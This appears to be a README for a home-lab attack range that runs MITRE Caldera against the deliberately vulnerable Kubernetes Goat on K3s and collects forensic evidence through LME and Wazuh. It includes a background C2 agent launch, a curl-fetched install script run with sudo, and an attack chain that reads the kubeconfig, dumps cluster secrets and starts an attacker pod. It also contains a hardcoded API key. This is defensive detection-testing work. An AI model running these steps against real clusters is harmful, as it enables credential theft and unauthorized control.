# Attack Test Range

Adversary simulation using MITRE Caldera against Kubernetes Goat on a K3s cluster, with forensic evidence collection via LME.

## Architecture

```
LME Server (10.x.10.10)          Caldera (10.x.10.20)
  └─ ES, Kibana, Wazuh, AI stack    └─ C2 server
       ↑ telemetry                        ↓ commands
Ubuntu Endpoint (10.x.10.40)
  ├─ K3s + Kubernetes Goat (10 vulnerable workloads)
  ├─ Elastic Agent → LME
  ├─ Wazuh Agent → LME
  └─ Caldera Sandcat Agent → Caldera
```

## Setup Steps

### 1. Deploy K3s

```bash
ssh localuser@<ubuntu-ip>
curl -sfL https://get.k3s.io -o /tmp/k3s-install.sh
sudo bash /tmp/k3s-install.sh
```

### 2. Deploy Kubernetes Goat

```bash
sudo git clone https://github.com/madhuakula/kubernetes-goat.git /opt/kubernetes-goat
cd /opt/kubernetes-goat
sudo bash setup-kubernetes-goat.sh
```

### 3. Deploy Caldera Agent

```bash
# Copy binary from Caldera server
scp localuser@<caldera-ip>:/opt/caldera/plugins/sandcat/payloads/sandcat.go-linux ./sandcat
chmod +x sandcat
sudo nohup ./sandcat -server http://<caldera-ip>:8888 -group k8s-target &
```

### 4. Create Caldera Adversary Profile

Via the Caldera API (`http://<caldera-ip>:8888`, KEY: `ADMIN123`):

```bash
# Create abilities (discovery, credential theft, lateral movement, etc.)
curl -X POST http://<caldera>:8888/api/v2/abilities -H "KEY:ADMIN123" \
  -H "Content-Type: application/json" -d '{"ability_id":"k8s-disco-001", ...}'

# Create adversary profile
curl -X POST http://<caldera>:8888/api/v2/adversaries -H "KEY:ADMIN123" \
  -H "Content-Type: application/json" -d '{"adversary_id":"k8s-scarleteel", "atomic_ordering":[...]}'

# Launch operation
curl -X POST http://<caldera>:8888/api/v2/operations -H "KEY:ADMIN123" \
  -H "Content-Type: application/json" -d '{"name":"K8s-Attack", "adversary":{"adversary_id":"k8s-scarleteel"}, "group":"k8s-target"}'
```

### 5. Attack Chain (MITRE ATT&CK)

| Phase | Technique | Command |
|-------|-----------|---------|
| Discovery | T1613 | `k3s kubectl get pods -A` |
| Credential Theft | T1552.001 | `cat /etc/rancher/k3s/k3s.yaml` |
| Secret Dump | T1552.001 | `k3s kubectl get secrets -A -o json` |
| Lateral Movement | T1610 | `k3s kubectl run attacker --image=alpine` |
| Privilege Escalation | T1078.004 | `k3s kubectl auth can-i --list` |
| Collection | T1005 | `k3s kubectl get configmaps -A -o json` |

### 6. Forensic Evidence Collection

Use `forensic-analysis.ipynb` pattern:

1. Paramiko persistent shell to target
2. `/proc` enumeration for anomalous shells (UID=0, GID≠0)
3. Query Wazuh alerts via ES API
4. Check `auth.log` for privilege escalation
5. Compare page cache vs disk hashes

### 7. Detection Gaps (Expected)

LME won't catch K8s-specific attacks without audit log integration:
- `kubectl` commands visible via process telemetry
- Wazuh FIM won't trigger for kubeconfig reads by default
- No K8s audit log forwarding to ES
- See main report Appendix D for remediation plan
